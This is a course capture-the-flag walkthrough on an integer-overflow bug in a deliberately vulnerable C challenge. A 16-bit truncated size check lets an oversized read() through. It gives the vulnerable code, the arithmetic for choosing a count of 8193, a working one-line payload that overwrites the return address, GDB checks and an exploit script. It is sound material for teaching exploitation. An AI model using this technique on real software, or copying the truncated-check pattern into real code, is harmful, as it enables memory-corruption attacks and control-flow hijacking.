# Integer Overflow Walkthrough (Exam-Ready)

## What you should recognize in 10 seconds

This challenge is an integer-overflow guard bypass:

- Check path uses a narrowed value:
  - `checked_bytes = (uint16_t)(count * 8)`
- Use path uses the full value:
  - `read(..., (size_t)count * 8)`

That mismatch is the bug. If you choose `count` so low 16 bits are small, the check passes, but the actual read is huge.

---

## Vulnerable code pattern

From [ctf/12-integer-overflow/challenge.c](ctf/12-integer-overflow/challenge.c):

```c
checked_bytes = (uint16_t)(count * 8u);

if (checked_bytes > sizeof(buf)) {
    puts("Too large!");
    return;
}

read(0, buf, (size_t)count * 8u);
```

`buf` is 64 bytes, so check expects at most 64 bytes. But `read` can still receive far more.

---

## Fast exam math

Let:

- `real = count * 8`
- `checked = real & 0xFFFF`

You need both:

1. `checked <= 64` (pass the check)
2. `real >= offset_to_ret + 8` (reach and overwrite RIP)

For this binary, `offset_to_ret = 88`, so you need at least 96 real bytes.

A valid count is `8193`:

- `real = 8193 * 8 = 65544`
- `checked = 65544 mod 65536 = 8` (passes)

---

## Exploit layout

On this binary, overwrite layout is:

- `A * 88`
- little-endian `jump()` address (8 bytes)

So payload is:

```text
[88 bytes filler][8-byte target RIP]
```

---

## Manual solve

### 1) Build and run

```bash
cd /home/jbenjam7/cs466/ctf/12-integer-overflow
gcc -O0 -fno-stack-protector -no-pie -o challenge challenge.c
./challenge
```

The program prints `jump() @ ...`.

### 2) Send exploit

If printed address is `0x401218`, send:

```bash
(printf '8193\n'; python3 -c 'import sys; sys.stdout.buffer.write(b"A"*88 + bytes.fromhex("1812400000000000"))') | ./challenge
```

Expected success:

```text
cosc466-flag-{1nt3g3r_0v3rfl0w}
```

---

## Better workflow (what to do on exam)

Use this repeatable checklist:

1. Find mismatch:
   - Narrow type in check (`uint8_t/uint16_t/int16_t`) vs wider type in actual use.
2. Write equations:
   - `checked = expression & ((1<<n)-1)`
   - `real = full expression`
3. Pick passing but large input:
   - `checked` small enough, `real` big enough for your overwrite.
4. Get target address:
   - Leak from program output or use `nm/objdump`.
5. Find offset:
   - Cyclic pattern or quick GDB frame check.
6. Send final payload:
   - `prefix_input + overflow + target address`.

---

## Use the improved exploit script

Use [ctf/12-integer-overflow/exploit.py](ctf/12-integer-overflow/exploit.py):

```bash
cd /home/jbenjam7/cs466/ctf/12-integer-overflow
python3 exploit.py
```

What it does:

- finds `jump` with `nm`/`objdump`
- auto-picks a valid `count`
- sends `[count\n][A*offset][target RIP]`

Useful flags:

```bash
python3 exploit.py --binary ./challenge --symbol jump --offset 88
python3 exploit.py --count 8193
```

---

## Quick GDB confirmation

```bash
gdb -q ./challenge
```

In GDB:

```gdb
disassemble vuln
break *vuln+62
run
```

Enter `8193` for count, then send payload. At breakpoint:

```gdb
x/4gx $rbp
```

You should observe the saved return address location overwritten with your `jump` target.

---

## Common mistakes

- Using a count that passes check but does not provide enough real bytes.
- Forgetting little-endian address packing.
- Wrong return offset for the compiled binary.
- Assuming exact offsets from a different compile (flags can move stack layout).

---

## One-line takeaway

Integer overflow is the door, but control-flow overwrite is still the win condition: pick input where truncated math passes validation while full-width math drives an oversized memory operation.
